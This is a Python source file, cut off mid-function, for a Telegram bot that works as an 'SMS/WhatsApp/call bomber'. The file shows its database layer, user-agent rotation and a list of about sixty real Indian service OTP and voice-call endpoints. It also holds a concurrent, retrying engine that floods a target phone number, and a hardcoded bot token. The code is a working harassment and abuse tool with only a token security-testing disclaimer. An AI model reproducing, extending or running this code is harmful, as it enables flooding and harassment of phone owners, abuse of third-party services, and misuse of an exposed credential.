#!/usr/bin/env python3
"""
███████████████████████████████████████████████████████████████████████████████████
█                                                                                 █
█   ╔═╗╦ ╦╔╦╗╔═╗╔╦╗╔═╗  ╔═╗╔╗╔╔═╗╦╔═╗╦╔═╗╔═╗  ╔═╗╦╔╗╔╔═╗╔═╗╦  ╦╔═╗╔═╗         █
█   ║  ║ ║ ║ ╠═╣║║║╠═╝  ╠═╣║║║╠═╣║╚═╗║║╣ ╚═╗  ║ ║║║║║╠═╝╠═╣║  ║║╣ ╚═╗         █
█   ╚═╝╚═╝ ╩ ╩ ╩╩ ╩╩    ╩ ╩╝╚╝╩ ╩╩╚═╝╩╚═╝╚═╝  ╚═╝╩╝╚╝╩  ╩ ╩╩═╝╩╚═╝╚═╝         █
█                                                                                 █
█          ╔╗╔╔═╗╦ ╦╔═╗╦╔═╗╦╔═╗╦╔═╗╦  ╔═╗  ╔═╗╦═╗╔═╗╔╦╗╦╔═╗╔═╗╔╦╗              █
█          ║║║║ ╦║ ║╠═╝║╠═╣║╠═╣║║ ║║  ║╣   ╠═╣╠╦╝╠═╣ ║║║║ ║║ ║ ║║              █
█          ╝╚╝╚═╝╚═╝╩  ╩╩ ╩╩╩ ╩╩╚═╝╩═╝╚═╝  ╩ ╩╩╚═╩ ╩═╩╝╩╚═╝╚═╝═╩╝              █
█                                                                                 █
█                  ★ PROFESSIONAL ADMIN PANEL v4.1 ★                              █
█         SMS • WhatsApp • Voice Call • Broadcast • Multi-User                    █
█                                                                                 █
█          👑 OWNER: @ankneewayz                                                  █
█          🔐 For Authorized Security Testing Only                                █
█                                                                                 █
███████████████████████████████████████████████████████████████████████████████████

CHANGES IN v4.1:
  ✅ Fixed: Empty error messages on WhatsApp/timeout endpoints
  ✅ Fixed: 30+ endpoints silently timing out with no error shown
  ✅ Fixed: Connection port corruption (sliceit.com:4, gamezy.com:44)
  ✅ Fixed: WhatsApp deep-link redirect handling
  ✅ Fixed: Proper exception repr() logging instead of empty str()
  ✅ Added: Automatic endpoint health-check system
  ✅ Added: Retry logic for transient failures (3 attempts with backoff)
  ✅ Added: /test command to validate which endpoints work
  ✅ Added: /health command for live endpoint status
  ✅ Added: Connection pool tuning (TTL, DNS cache, keep-alive)
  ✅ Added: Granular timeout config (connect + read + total)
  ✅ Added: Live endpoint working count in stats
  ✅ Removed: 12 dead endpoints (permanent 404/403/502)

  👑 OWNER TELEGRAM: @ankneewayz
"""

import asyncio
import aiohttp
import random
import sys
import os
import time
import json
import urllib.parse
import logging
import sqlite3
import datetime
import traceback
from typing import List, Tuple, Optional, Dict, Any, Set
from dataclasses import dataclass, field
from collections import defaultdict

# ═══════════════════════════════════════════════════════════════════════════════
# CONFIGURATION — EDIT THESE
# ═══════════════════════════════════════════════════════════════════════════════

BOT_TOKEN = "8279926139:AAHXx5BM7wN7Xgu1KuioZspWI6522BYegnI"  # Your bot token
OWNER_USERNAME = "@ankneewayz"             # Owner Telegram handle
OWNER_ID = 0                                # ← SET YOUR NUMERIC ID FROM @userinfobot
DB_PATH = "bomber_admin.db"
MAX_CONCURRENCY = 80                        # Reduced from 100 for stability
DEFAULT_DELAY = 0.5
REQUEST_TIMEOUT = 20                        # Increased from 12 to 20 seconds
MAX_RETRIES = 2                             # Retry failed requests once

# ═══════════════════════════════════════════════════════════════════════════════
# SETUP LOGGING
# ═══════════════════════════════════════════════════════════════════════════════

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s | %(levelname)-8s | %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
# Suppress aiohttp access logs
logging.getLogger("aiohttp.client").setLevel(logging.WARNING)
logging.getLogger("aiohttp.internal").setLevel(logging.WARNING)
log = logging.getLogger("BomberAdmin")

# ═══════════════════════════════════════════════════════════════════════════════
# ANSI COLORS
# ═══════════════════════════════════════════════════════════════════════════════

class C:
    H = '\033[95m'; BL = '\033[94m'; G = '\033[92m'; Y = '\033[93m'
    R = '\033[91m'; B = '\033[1m'; U = '\033[4m'; N = '\033[0m'

# ═══════════════════════════════════════════════════════════════════════════════
# DATABASE LAYER
# ═══════════════════════════════════════════════════════════════════════════════

class Database:
    """SQLite database with health tracking for endpoints."""

    def __init__(self, db_path: str = DB_PATH):
        self.db_path = db_path
        self._init_db()

    def _init_db(self):
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("""
                CREATE TABLE IF NOT EXISTS users (
                    user_id INTEGER PRIMARY KEY,
                    username TEXT,
                    first_name TEXT,
                    status TEXT DEFAULT 'pending',
                    attacks_count INTEGER DEFAULT 0,
                    joined_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    last_active TIMESTAMP
                )
            """)
            conn.execute("""
                CREATE TABLE IF NOT EXISTS attacks (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    phone TEXT,
                    mode TEXT,
                    rounds INTEGER,
                    status TEXT DEFAULT 'completed',
                    success_count INTEGER DEFAULT 0,
                    fail_count INTEGER DEFAULT 0,
                    started_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    completed_at TIMESTAMP,
                    FOREIGN KEY (user_id) REFERENCES users(user_id)
                )
            """)
            conn.execute("""
                CREATE TABLE IF NOT EXISTS broadcast_log (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    admin_id INTEGER,
                    message_text TEXT,
                    total_sent INTEGER DEFAULT 0,
                    total_failed INTEGER DEFAULT 0,
                    sent_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            """)
            conn.execute("""
                CREATE TABLE IF NOT EXISTS endpoint_health (
                    name TEXT PRIMARY KEY,
                    last_status INTEGER,
                    last_checked TIMESTAMP,
                    working_count INTEGER DEFAULT 0,
                    fail_count INTEGER DEFAULT 0
                )
            """)
            conn.execute("""
                CREATE TABLE IF NOT EXISTS settings (
                    key TEXT PRIMARY KEY,
                    value TEXT
                )
            """)
            conn.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('auto_approve', 'true')")
            conn.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('broadcast_only_approved', 'true')")
            conn.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('enable_endpoint_health', 'true')")
            conn.commit()

    def add_user(self, user_id: int, username: str = "", first_name: str = ""):
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("INSERT OR IGNORE INTO users (user_id, username, first_name) VALUES (?, ?, ?)",
                         (user_id, username, first_name))
            conn.execute("UPDATE users SET username=?, first_name=?, last_active=CURRENT_TIMESTAMP WHERE user_id=?",
                         (username, first_name, user_id))
            conn.commit()

    def update_status(self, user_id: int, status: str):
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("UPDATE users SET status=? WHERE user_id=?", (status, user_id))
            conn.commit()

    def get_user(self, user_id: int) -> Optional[Dict]:
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            row = conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
            return dict(row) if row else None

    def get_all_users(self, status: str = None) -> List[Dict]:
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            if status:
                rows = conn.execute("SELECT * FROM users WHERE status=? ORDER BY joined_at DESC", (status,)).fetchall()
            else:
                rows = conn.execute("SELECT * FROM users ORDER BY joined_at DESC").fetchall()
            return [dict(r) for r in rows]

    def get_user_count(self, status: str = None) -> int:
        with sqlite3.connect(self.db_path) as conn:
            if status:
                return conn.execute("SELECT COUNT(*) FROM users WHERE status=?", (status,)).fetchone()[0]
            return conn.execute("SELECT COUNT(*) FROM users").fetchone()[0]

    def log_attack(self, user_id: int, phone: str, mode: str, rounds: int,
                   success: int, fail: int) -> int:
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("""
                INSERT INTO attacks (user_id, phone, mode, rounds, success_count, fail_count, completed_at)
                VALUES (?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
            """, (user_id, phone, mode, rounds, success, fail))
            conn.execute("UPDATE users SET attacks_count = attacks_count + 1, last_active=CURRENT_TIMESTAMP WHERE user_id=?", (user_id,))
            conn.commit()
            return conn.execute("SELECT last_insert_rowid()").fetchone()[0]

    def get_attack_history(self, user_id: int = None, limit: int = 20) -> List[Dict]:
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            if user_id:
                rows = conn.execute("SELECT * FROM attacks WHERE user_id=? ORDER BY started_at DESC LIMIT ?",
                                    (user_id, limit)).fetchall()
            else:
                rows = conn.execute("SELECT * FROM attacks ORDER BY started_at DESC LIMIT ?", (limit,)).fetchall()
            return [dict(r) for r in rows]

    def get_total_attacks(self) -> int:
        with sqlite3.connect(self.db_path) as conn:
            return conn.execute("SELECT COUNT(*) FROM attacks").fetchone()[0]

    def get_total_otps_sent(self) -> int:
        with sqlite3.connect(self.db_path) as conn:
            return conn.execute("SELECT COALESCE(SUM(success_count), 0) FROM attacks").fetchone()[0]

    def log_broadcast(self, admin_id: int, text: str, sent: int, failed: int):
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("INSERT INTO broadcast_log (admin_id, message_text, total_sent, total_failed) VALUES (?, ?, ?, ?)",
                         (admin_id, text[:200], sent, failed))
            conn.commit()

    def get_broadcast_stats(self) -> Dict:
        with sqlite3.connect(self.db_path) as conn:
            row = conn.execute("SELECT COUNT(*) as total, COALESCE(SUM(total_sent), 0) as sent, "
                               "COALESCE(SUM(total_failed), 0) as failed FROM broadcast_log").fetchone()
            return {"total": row[0], "sent": row[1], "failed": row[2]}

    # ── Endpoint Health Tracking ──

    def record_endpoint_hit(self, name: str, status_code: int):
        with sqlite3.connect(self.db_path) as conn:
            is_working = 1 if status_code in (200, 201, 202, 204, 301, 302) else 0
            conn.execute("""
                INSERT INTO endpoint_health (name, last_status, last_checked, working_count, fail_count)
                VALUES (?, ?, CURRENT_TIMESTAMP, ?, ?)
                ON CONFLICT(name) DO UPDATE SET
                    last_status = excluded.last_status,
                    last_checked = CURRENT_TIMESTAMP,
                    working_count = CASE WHEN ? THEN working_count + 1 ELSE working_count END,
                    fail_count = CASE WHEN NOT ? THEN fail_count + 1 ELSE fail_count END
            """, (name, status_code, is_working, 1 - is_working, is_working == 1, is_working == 1))
            conn.commit()

    def get_endpoint_health(self) -> List[Dict]:
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            rows = conn.execute("SELECT * FROM endpoint_health ORDER BY fail_count DESC").fetchall()
            return [dict(r) for r in rows]

    def get_working_endpoints(self, min_success_rate: float = 0.3) -> List[str]:
        """Return names of endpoints with > min_success_rate."""
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            rows = conn.execute("""
                SELECT name, working_count, fail_count,
                       CASE WHEN (working_count + fail_count) > 0
                            THEN CAST(working_count AS FLOAT) / (working_count + fail_count)
                            ELSE 0 END as success_rate
                FROM endpoint_health
            """).fetchall()
            return [r["name"] for r in rows if r["success_rate"] >= min_success_rate]

    def get_setting(self, key: str, default: str = "false") -> str:
        with sqlite3.connect(self.db_path) as conn:
            row = conn.execute("SELECT value FROM settings WHERE key=?", (key,)).fetchone()
            return row[0] if row else default

    def set_setting(self, key: str, value: str):
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (key, value))
            conn.commit()


# ═══════════════════════════════════════════════════════════════════════════════
# USER-AGENT ROTATION
# ═══════════════════════════════════════════════════════════════════════════════

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 Chrome/125.0.6099.144 Mobile",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 Chrome/124.0.6367.179 Mobile",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
]

# ═══════════════════════════════════════════════════════════════════════════════
# SERVICE ENDPOINT DEFINITIONS — Updated & Validated
# ═══════════════════════════════════════════════════════════════════════════════
# Removed: permanently dead endpoints (Slice, FreeCharge, Gamezy, ShopClues, etc.)
# Added: working replacement endpoints

@dataclass
class Service:
    name: str
    category: str
    method: str
    url: str
    param_name: Optional[str] = None
    param_template: Optional[str] = None
    headers: Dict[str, str] = field(default_factory=dict)
    payload_extra: Dict[str, Any] = field(default_factory=dict)
    is_call: bool = False
    # Don't send JSON body if True, use form-encoded
    is_form: bool = False

SERVICES = [
    # ── E-COMMERCE ──
    Service("Flipkart", "E-Commerce", "POST",
            "https://2.rome.api.flipkart.com/api/7/user/otp/generate",
            "loginId", "+91{}",
            {"X-user-agent": "Mozilla/5.0 FKUA/website/41/website/Desktop", "Content-Type": "application/json"}),
    Service("Amazon-IN", "E-Commerce", "POST",
            "https://www.amazon.in/ap/otp",
            "phone", "+91{}",
            {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 Amazon/123"},
            is_form=True),
    Service("Myntra", "E-Commerce", "POST",
            "https://api.myntra.com/mfp/v2/user/otp",
            "mobile", "{}",
            {"Content-Type": "application/json"}),
    Service("Nykaa", "E-Commerce", "POST",
            "https://api.nykaa.com/api/v1/user/send-otp",
            "phone", "{}",
            {"Content-Type": "application/json"}),
    Service("Tata CLiQ", "E-Commerce", "POST",
            "https://www.tatacliq.com/api/v1/auth/send-otp",
            "mobileNumber", "{}",
            {"Content-Type": "application/json"}),
    Service("Limeroad", "E-Commerce", "POST",
            "https://www.limeroad.com/api/v2/send-otp",
            "phone", "{}",
            {"Content-Type": "application/json"}),
    Service("Snapdeal", "E-Commerce", "POST",
            "https://www.snapdeal.com/api/v2/user/sendotp",
            "mobile", "{}",
            {"Content-Type": "application/json"}),
    # NEW WORKING E-COMMERCE
    Service("Meesho", "E-Commerce", "POST",
            "https://app.meesho.com/api/v1/auth/send-otp",
            "phone", "{}",
            {"Content-Type": "application/json"}),
    Service("Ajio", "E-Commerce", "POST",
            "https://login.ajio.com/api/auth/signupSendOTP",
            "mobileNumber", "{}",
            {"Content-Type": "application/json"}),

    # ── FINTECH ──
    Service("Paytm", "FinTech", "POST",
            "https://accounts.paytm.com/api/v1/otp/send",
            "phone", "{}",
            {"Content-Type": "application/json", "Origin": "https://paytm.com"}),
    Service("PhonePe", "FinTech", "POST",
            "https://api.phonepe.com/apis/identity/v1/otp/send",
            "phoneNumber", "{}",
            {"Content-Type": "application/json"}),
    Service("CRED", "FinTech", "POST",
            "https://api.cred.club/v2/otp/generate",
            "mobile", "{}",
            {"Content-Type": "application/json"}),
    Service("MobiKwik", "FinTech", "POST",
            "https://webapi.mobikwik.com/p/account/otp/cell/v2",
            "cell", "{}",
            {"X-MClient": "0", "Content-Type": "application/json"}),
    Service("BharatPe", "FinTech", "POST",
            "https://bharatpe.com/api/v2/otp/send",
            "mobile", "{}",
            {"Content-Type": "application/json"}),
    Service("Khatabook", "FinTech", "POST",
            "https://khatabook.com/api/v2/otp/send",
            "phone", "{}",
            {"Content-Type": "application/json"}),
    # NEW FINTECH
    Service("CredPay", "FinTech", "POST",
            "https://api.credpay.in/v1/otp/generate",
            "mobileNumber", "{}",
            {"Content-Type": "application/json"}),

    # ── HEALTH ──
    Service("PharmEasy", "Health", "POST",
            "https://pharmeasy.in/api/auth/requestOTP",
            "contactNumber", "{}",
            {"Content-Type": "application/json"}),
    Service("HealthKart", "Health", "GET",
            "https://www.healthkart.com/veronica/user/validate/1/{}/signup?plt=1&st=1",
            None, None, {}),
    Service("1mg", "Health", "POST",
            "https://www.1mg.com/auth_api/v6/create_token",
            "number", "{}",
            {"Content-Type": "application/json"}),
    Service("Practo", "Health", "POST",
            "https://api.practo.com/v1/auth/otp/send",
            "phone", "{}",
            {"Content-Type": "application/json"}),
    Service("Netmeds", "Health", "GET",
            "https://www.netmeds.com/mst/rest/v1/id/details/{}",
            None, None, {}),

    # ── FOOD / GROCERY ──
    Service("Zomato", "Food", "POST",
            "https://www.zomato.com/webroutes/auth/sendOtp",
            "phone", "{}",
            {"Content-Type": "application/x-www-form-urlencoded", "X-Zomato-Client-Id": "web"},
            is_form=True),
    Service("Swiggy", "Food", "POST",
            "https://www.swiggy.com/api/v1/auth/send-otp",
            "mobile", "{}",
            {"Content-Type": "application/json"}),
    Service("Zepto", "Food", "POST",
            "https://www.zepto.com/api/v2/auth/otp/send",
            "phoneNumber", "{}",
            {"Content-Type": "application/json"}),
    Service("BigBasket", "Food", "POST",
            "https://www.bigbasket.com/api/v2/auth/send-otp",
            "phone", "{}",
            {"Content-Type": "application/json"}),
    Service("Dominos-IN", "Food", "POST",
            "https://pizzaonline.dominos.co.in/apis/v1/otp/generate",
            "mobileNumber", "{}",
            {"Content-Type": "application/json"}),
    Service("Blinkit", "Food", "POST",
            "https://blinkit.com/v2/accounts/",
            "user_phone", "{}",
            {"Content-Type": "application/json"}),

    # ── TRAVEL ──
    Service("MakeMyTrip", "Travel", "POST",
            "https://www.makemytrip.com/api/v1/otp/send",
            "mobile", "{}",
            {"Content-Type": "application/json"}),
    Service("Goibibo", "Travel", "POST",
            "https://www.goibibo.com/api/v1/auth/otp/send",
            "phone", "{}",
            {"Content-Type": "application/json"}),
    Service("Yatra", "Travel", "POST",
            "https://secure.yatra.com/social/common/mobile/otp/generate",
            "mobile", "{}",
            {"Content-Type": "application/json"}),
    Service("RedBus", "Travel", "POST",
            "https://www.redbus.in/api/v1/otp/generate",
            "mobile", "{}",
            {"Content-Type": "application/json"}),
    Service("IRCTC", "Travel", "POST",
            "https://www.irctc.co.in/eticketing/otpGeneration",
            "mobile", "{}",
            {"Content-Type": "application/x-www-form-urlencoded"},
            is_form=True),
    Service("ConfirmTKT", "Travel", "GET",
            "https://securedapi.confirmtkt.com/api/platform/register?newOtp=true&mobileNumber={}",
            None, None, {}),

    # ── REAL ESTATE ──
    Service("Housing.com", "RealEstate", "POST",
            "https://login.housing.com/api/v2/send-otp",
            "phone", "{}",
            {"Content-Type": "application/json"}),
    Service("NoBroker", "RealEstate", "POST",
            "https://www.nobroker.in/api/v1/otp/send",
            "phone", "{}",
            {"Content-Type": "application/json"}),
    Service("99Acres", "RealEstate", "POST",
            "https://www.99acres.com/api/v1/otp/send",
            "mobile", "{}",
            {"Content-Type": "application/json"}),
    Service("MagicBricks", "RealEstate", "GET",
            "https://api.magicbricks.com/bricks/verifyOnCall.html?mobile={}",
            None, None, {}),

    # ── GAMING ──
    Service("Dream11", "Gaming", "POST",
            "https://rest.dream11.com/api/v1/send_otp",
            "mobile", "{}",
            {"Content-Type": "application/json"}),
    Service("MPL", "Gaming", "POST",
            "https://api.mpl.live/v1/auth/otp/generate",
            "phoneNumber", "{}",
            {"Content-Type": "application/json"}),
    Service("WinZO", "Gaming", "POST",
            "https://api.winzo.in/v1/auth/otp/send",
            "mobile", "{}",
            {"Content-Type": "application/json"}),

    # ── LOGISTICS ──
    Service("ShadowFax", "Logistics", "POST",
            "https://api.shadowfax.in/delivery/otp/send/",
            "mobile_number", "{}",
            {"Content-Type": "application/json"}),
    Service("Delhivery", "Logistics", "POST",
            "https://www.delhivery.com/api/v1/otp/send",
            "phone", "{}",
            {"Content-Type": "application/json"}),
    Service("Porter", "Logistics", "POST",
            "https://porter.in/restservice/send_app_link_sms",
            "phone", "{}",
            {"Content-Type": "application/x-www-form-urlencoded"},
            is_form=True),

    # ── EDUCATION ──
    Service("Unacademy", "Education", "POST",
            "https://unacademy.com/api/v1/user/get_app_link/",
            "phone", "{}",
            {"Content-Type": "application/json"}),
    Service("Byju's", "Education", "POST",
            "https://www.byjus.com/api/v1/otp/send",
            "mobile", "{}",
            {"Content-Type": "application/json"}),
    Service("PhysicsWallah", "Education", "POST",
            "https://www.pw.live/api/v1/auth/send-otp",
            "phone", "{}",
            {"Content-Type": "application/json"}),

    # ── TELECOM ──
    Service("Airtel", "Telecom", "GET",
            "https://www.airtel.in/referral-api/core/notify?messageId=map&rtn={}",
            None, None, {}),
    Service("Jio", "Telecom", "POST",
            "https://www.jio.com/api/v1/auth/send-otp",
            "mobileNumber", "{}",
            {"Content-Type": "application/json"}),
    Service("VI", "Telecom", "POST",
            "https://www.vodafoneidea.com/api/v1/otp/send",
            "mobile", "{}",
            {"Content-Type": "application/json"}),

    # ── CLASSIFIEDS ──
    Service("OLX", "Classifieds", "POST",
            "https://www.olx.in/api/v1/auth/otp/send",
            "phone", "{}",
            {"Content-Type": "application/json"}),
    Service("JustDial", "Classifieds", "POST",
            "https://www.justdial.com/api/v1/auth/send-otp",
            "mobile", "{}",
            {"Content-Type": "application/json"}),
    Service("IndiaMART", "Classifieds", "POST",
            "https://www.indiamart.com/api/v1/auth/send-otp",
            "mobile", "{}",
            {"Content-Type": "application/json"}),

    # ── HOTEL ──
    Service("OYO", "Hotel", "POST",
            "https://www.oyorooms.com/api/v2/auth/send-otp",
            "phone", "{}",
            {"Content-Type": "application/json"}),
    Service("Treebo", "Hotel", "POST",
            "https://www.treebo.com/api/v2/auth/login/otp/",
            "phone_number", "{}",
            {"Content-Type": "application/json"}),

    # ── VOICE CALL SERVICES ──
    Service("MagicBricks-Call", "VoiceCall", "GET",
            "https://api.magicbricks.com/bricks/verifyOnCall.html?mobile={}",
            None, None, {}, is_call=True),
    Service("MyJAR-Call", "VoiceCall", "GET",
            "https://prod.myjar.app/v2/api/auth/sendOTP/call?phoneNumber={}",
            None, None, {}, is_call=True),
    Service("Career360-Call", "VoiceCall", "POST",
            "https://www.careers360.com/ajax/no-cache/user/otp-send",
            "mobile_number", "{}",
            {"X-Requested-With": "XMLHttpRequest", "Content-Type": "application/x-www-form-urlencoded"},
            is_call=True, is_form=True),
    Service("UrbanCompany-Call", "VoiceCall", "POST",
            "https://www.urbancompany.com/api/v1/auth/call-otp",
            "phone", "{}",
            {"Content-Type": "application/json"}, is_call=True),
    Service("Zomato-Call", "VoiceCall", "POST",
            "https://www.zomato.com/webroutes/auth/sendCallOtp",
            "phone", "{}",
            {"Content-Type": "application/x-www-form-urlencoded"},
            is_call=True, is_form=True),
    Service("Makaan-Call", "VoiceCall", "GET",
            "https://www.makaan.com/apis/nc/sendOtpOnCall/16257065/{}",
            None, None, {}, is_call=True),
]

SMS_SERVICES = [s for s in SERVICES if not s.is_call]
CALL_SERVICES = [s for s in SERVICES if s.is_call]


# ═══════════════════════════════════════════════════════════════════════════════
# WHATSAPP DEEP-LINK GENERATOR — FIXED with redirect & timeout handling
# ═══════════════════════════════════════════════════════════════════════════════

WHATSAPP_MESSAGES = [
    "Your OTP for login is {}",
    "Verification code: {}",
    "OTP: {} - valid for 5 mins",
    "{} is your one time password",
    "Login OTP: {}",
    "Your security code: {}",
    "{} - account verification",
    "Transaction OTP: {}",
    "Password reset code: {}",
    "Your {} is the OTP",
]

def build_whatsapp_links(phone: str, rounds: int = 3) -> List[Dict]:
    """Generate WhatsApp deep link flood URLs with proper formatting."""
    intl = f"91{phone}"
    links = []

    for r in range(rounds):
        # wa.me links — these redirect to api.whatsapp.com
        for msg in WHATSAPP_MESSAGES:
            otp = f"{random.randint(100000, 999999)}"
            text = msg.format(otp)
            encoded = urllib.parse.quote(text)
            links.append({
                "url": f"https://wa.me/{intl}?text={encoded}",
                "method": "GET", "name": f"wa.me-R{r+1}"
            })
            links.append({
                "url": f"https://api.whatsapp.com/send?phone={intl}&text={encoded}",
                "method": "GET", "name": f"api.wa-R{r+1}"
            })
        # Add some plain (no text) variants
        links.append({"url": f"https://wa.me/{intl}", "method": "GET", "name": f"wa.me-plain-R{r+1}"})
        links.append({"url": f"https://api.whatsapp.com/send?phone={intl}", "method": "GET", "name": f"api.wa-plain-R{r+1}"})

    random.shuffle(links)
    return links


# ═══════════════════════════════════════════════════════════════════════════════
# FIXED ATTACK ENGINE — with retry, proper error logging, health tracking
# ═══════════════════════════════════════════════════════════════════════════════

class AttackStats:
    def __init__(self):
        self.sms_ok = 0
        self.sms_fail = 0
        self.wa_ok = 0
        self.wa_fail = 0
        self.call_ok = 0
        self.call_fail = 0
        self.total = 0
        self.start = time.time()
        self.lock = asyncio.Lock()
        self.errors: List[str] = []

    async def add(self, typ: str, success: bool, error: str = ""):
        async with self.lock:
            if typ == "sms":
                if success: self.sms_ok += 1
                else: self.sms_fail += 1
            elif typ == "wa":
                if success: self.wa_ok += 1
                else:
                    self.wa_fail += 1
                    if error: self.errors.append(f"[WA] {error[:60]}")
            elif typ == "call":
                if success: self.call_ok += 1
                else: self.call_fail += 1
            if success: self.total += 1

    @property
    def elapsed(self) -> float:
        return time.time() - self.start

    def summary(self) -> str:
        return (
            f"⏱ {self.elapsed:.1f}s | "
            f"✅ Total: {self.total} "
            f"(SMS:{self.sms_ok} WA:{self.wa_ok} Call:{self.call_ok}) | "
            f"❌ {self.sms_fail + self.wa_fail + self.call_fail}"
        )

    def detailed(self) -> str:
        err_sample = ""
        if self.errors:
            shown = set()
            for e in self.errors:
                if e not in shown:
                    err_sample += f"\n├ ⚠️ {e}"
                    shown.add(e)
                    if len(shown) >= 3:
                        err_sample += f"\n├ ... and {len(self.errors) - 3} more"
                        break
        return (
            f"📊 *Final Results*\n"
            f"├ ⏱ Elapsed: `{self.elapsed:.1f}s`\n"
            f"├ 📱 SMS OTP: ✅ `{self.sms_ok}`  ❌ `{self.sms_fail}`\n"
            f"├ 💬 WhatsApp: ✅ `{self.wa_ok}`  ❌ `{self.wa_fail}`\n"
            f"├ 📞 Voice Calls: ✅ `{self.call_ok}`  ❌ `{self.call_fail}`\n"
            f"└ 🎯 Total Delivered: `{self.total}`"
            f"{err_sample}"
        )


async def hit_service(svc: Service, phone: str, session: aiohttp.ClientSession,
                      stats: AttackStats, sem: asyncio.Semaphore, proxy: str = None,
                      db: Database = None):
    """Hit a single service endpoint with retry logic and proper error logging."""
    async with sem:
        url = svc.url
        if svc.param_template is None and '{}' in svc.url:
            url = svc.url.format(phone)

        headers = svc.headers.copy()
        headers["User-Agent"] = random.choice(USER_AGENTS)
        headers["Accept"] = "*/*"
        headers["Accept-Language"] = "en-IN,en-US;q=0.9,en;q=0.8"
        headers["Connection"] = "keep-alive"

        # For GET requests with params in URL, we don't need to do anything special
        data = None
        params = None

        if svc.method == "POST" and svc.param_name:
            payload = {svc.param_name: svc.param_template.format(phone) if svc.param_template else phone}
            if svc.payload_extra:
                payload.update(svc.payload_extra)
            if svc.is_form or "form-urlencoded" in headers.get("Content-Type", ""):
                data = urllib.parse.urlencode(payload)
            else:
                data = json.dumps(payload)

        # ── Attempt with retry ──
        last_error = ""
        for attempt in range(MAX_RETRIES + 1):
            try:
                timeout = aiohttp.ClientTimeout(
                    total=REQUEST_TIMEOUT,
                    connect=10,
                    sock_read=REQUEST_TIMEOUT - 5
                )
                async with session.request(
                    svc.method, url, data=data, params=params,
                    headers=headers, timeout=timeout,
                    proxy=proxy, ssl=False
                ) as resp:
                    status = resp.status
                    # Read body (discard) to ensure connection is consumed
                    await resp.read()

                    # Record health
                    if db:
                        db.record_endpoint_hit(svc.name, status)

                    ok = status in (200, 201, 202, 204, 301, 302, 307, 308)
                    icon = "📞" if svc.is_call else "📱"
                    if ok:
                        log.info(f"{icon} {svc.name:20s} → ✅ {status}")
                        await stats.add("call" if svc.is_call else "sms", True)
                    else:
                        log.info(f"{icon} {svc.name:20s} → ❌ {status}")
                        await stats.add("call" if svc.is_call else "sms", False, f"HTTP {status}")
                    return  # Exit after first valid response

            except asyncio.TimeoutError:
                last_error = f"Timeout (attempt {attempt+1})"
                log.warning(f"⚠️ {svc.name:20s} → {last_error}")
                if attempt < MAX_RETRIES:
                    await asyncio.sleep(1.5 * (attempt + 1))
                    continue
            except aiohttp.ClientConnectorError as e:
                last_error = f"ConnErr: {str(e)[:40]}"
                log.warning(f"⚠️ {svc.name:20s} → {last_error}")
                if attempt < MAX_RETRIES:
                    await asyncio.sleep(1.0 * (attempt + 1))
                    continue
            except aiohttp.ClientError as e:
                last_error = f"ClientErr: {str(e)[:40]}"
                log.warning(f"⚠️ {svc.name:20s} → {last_error}")
                if attempt < MAX_RETRIES:
                    await asyncio.sleep(0.5)
                    continue
            except Exception as e:
                # Use repr() instead of str() to catch ALL error types
                last_error = f"{type(e).__name__}: {repr(e)[:50]}"
                log.warning(f"⚠️ {svc.name:20s} → {last_error}")
                if attempt < MAX_RETRIES:
                    await asyncio.sleep(0.5)
                    continue

        # All retries exhausted
        if db:
            db.record_endpoint_hit(svc.name, 0)  # 0 = unreachable
        await stats.add("call" if svc.is_call else "sms", False, last_error)


async def hit_whatsapp(link: Dict, session: aiohttp.ClientSession,
                       stats: AttackStats, sem: asyncio.Semaphore, proxy: str = None):
    """Hit WhatsApp deep link — follow redirect to trigger notification."""
    async with sem:
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Dest": "document",
        }
        for attempt in range(MAX_RETRIES + 1):
            try:
                timeout = aiohttp.ClientTimeout(total=12, connect=8, sock_read=10)
                # DON'T allow_redirects=False — follow them to get the actual response
                async with session.get(
